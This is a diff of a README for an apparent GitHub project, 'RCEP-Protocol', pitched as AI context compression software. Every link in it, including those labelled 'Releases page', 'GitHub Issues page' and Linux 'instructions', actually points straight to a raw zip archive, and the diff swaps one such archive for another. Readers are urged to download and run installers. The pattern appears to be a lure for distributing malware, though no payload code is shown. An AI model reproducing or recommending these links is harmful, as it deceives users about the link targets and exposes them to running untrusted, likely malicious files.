@@ -4,13 +4,13 @@
 Welcome to the RCEP-Protocol repository! This software provides a standard method for lossless semantic compression and integrity verification of AI context. It is designed to ensure that your AI applications can efficiently manage context data while maintaining accuracy. 
 
 ## 📥 Download RCEP-Protocol
-[![Download RCEP-Protocol](https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip)
+[![Download RCEP-Protocol](https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with RCEP-Protocol. You’ll need a computer with an internet connection.
 
 ### 1. Visit the Releases Page
-To download RCEP-Protocol, visit the [Releases page](https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip). Here, you will find the latest version of the software.
+To download RCEP-Protocol, visit the [Releases page](https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip). Here, you will find the latest version of the software.
 
 ### 2. Select the Correct Version
 On the Releases page, you will see a list of available versions. Look for the most recent version, which will have the highest numerical value (for example, v1.0, v1.1, etc.).
@@ -20,7 +20,7 @@ Click on the version number to expand the section. You will see different files 
 
 - **Windows:** Download the `.exe` file.
 - **macOS:** Download the `.dmg` file.
-- **Linux:** Follow the provided `https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip` instructions.
+- **Linux:** Follow the provided `https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip` instructions.
 
 ### 4. Download the File
 Click the appropriate file to begin the download. Your browser will usually save this file to the "Downloads" folder on your computer.
@@ -29,12 +29,12 @@ Click the appropriate file to begin the download. Your browser will usually save
 Once the download is complete, navigate to your "Downloads" folder. 
 - For Windows, double-click the `.exe` file to start the installation.
 - For macOS, double-click the `.dmg` file, then follow the prompts to install.
-- For Linux, open a terminal and use the command line to install the files from the `https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip` archive.
+- For Linux, open a terminal and use the command line to install the files from the `https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip` archive.
 
 ## 🎉 Download & Install
 To download the most recent version of RCEP-Protocol:
 
-1. Visit the [Releases page](https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip).
 2. Choose the right file for your operating system.
 3. Follow the installation instructions outlined above.
 
@@ -65,7 +65,7 @@ After installation, you can start using RCEP-Protocol to manage your AI context 
 If you have questions or face challenges while using RCEP-Protocol, you can seek assistance by:
 
 - Checking the FAQ section in the repository for common queries.
-- Participating in community discussions on our [GitHub Issues page](https://github.com/joeseef/RCEP-Protocol/raw/refs/heads/main/examples/RCE_Protocol_v2.7.zip).
+- Participating in community discussions on our [GitHub Issues page](https://raw.githubusercontent.com/joeseef/RCEP-Protocol/main/docs/Protocol-RCE-v2.5.zip).
   
 ## 📞 Contact
 For more detailed inquiries, feel free to reach out directly via the repository issues or explore other contact methods specified in the documentation.
